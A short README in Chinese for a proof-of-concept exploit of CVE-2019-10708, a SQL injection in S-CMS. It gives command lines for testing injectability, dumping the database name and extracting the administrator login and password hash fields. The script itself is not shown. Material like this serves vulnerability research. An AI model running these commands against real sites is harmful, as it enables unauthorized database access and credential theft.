# Scms - SQL Injection
exploit.py是對於CVE-2019-10708漏洞的PoC，實現multiprocessing進行注入，取得資料庫名稱與後台管理員帳密(建議是20190401前的版本)

## Usage
```
# 測試是否可注入
python3 exploit.py http:localhost/js/scms.php --test

# sleep時間為60秒與取得資料庫
python3 exploit.py http:localhost/js/scms.php -s 60 --db

# 取得A_login與A_pwd
python3 exploit.py http:localhost/js/scms.php --login --pwd
```

## CVE-2019-10708
[cve.mitre.org](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10708)

## Reference
http://www.iwantacve.cn/index.php/archives/185/